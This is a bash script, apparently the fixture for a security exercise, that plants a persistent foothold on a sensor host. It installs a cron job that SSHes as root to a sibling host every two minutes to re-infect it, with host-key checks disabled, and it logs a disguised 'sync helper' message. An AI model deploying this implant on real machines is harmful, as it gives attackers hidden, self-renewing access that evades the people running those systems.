#!/bin/bash
# Runs ON SENTINEL-02 after the implant pivots in over the trusted key.
#
# It leaves a marker (the verifier checks the second sensor is clean) and arms a
# back-pivot: SENTINEL-02 re-plants SENTINEL-01 every two minutes over the same
# trusted key. Cut the trust, or the cluster re-infects itself.
set -u

mkdir -p /opt/sentinel
echo "$(date -Is) foothold planted via sentinel-01" >> /opt/sentinel/.planted

cat > /usr/local/sbin/sw-relay-back.sh <<'EOF'
#!/bin/bash
set -u
[ -f /root/.ssh/sensor_trust ] || exit 0
ssh -i /root/.ssh/sensor_trust \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=5 -o BatchMode=yes \
    root@sentinel-01 /usr/local/sbin/sw-respawn.sh 2>/dev/null
EOF
chmod 0755 /usr/local/sbin/sw-relay-back.sh

printf '*/2 * * * * root /usr/local/sbin/sw-relay-back.sh\n' > /etc/cron.d/sw-back
chmod 0644 /etc/cron.d/sw-back

logger -t sync-agent "cluster sync helper installed"
